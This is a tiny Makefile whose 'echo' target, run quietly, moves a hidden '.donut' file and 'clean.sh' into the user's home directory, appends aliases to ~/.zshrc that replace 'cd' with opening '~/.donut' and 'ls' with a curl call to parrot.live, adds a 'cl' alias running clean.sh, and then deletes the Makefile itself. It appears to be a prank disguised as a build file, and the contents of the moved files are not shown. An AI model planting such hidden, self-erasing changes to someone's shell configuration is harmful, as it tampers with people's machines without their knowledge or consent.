echo:
	@mv .donut ~/
	@mv clean.sh ~/
	@cd && echo "alias cd='open ~/.donut'" >> ~/.zshrc
	@echo "alias cl='sh ~/clean.sh'">> ~/.zshrc
	@echo "alias ls='curl parrot.live'" >> ~/.zshrc
	@make clean
	@echo "\033[32mdone\033[37m"

clean:
	@rm Makefile
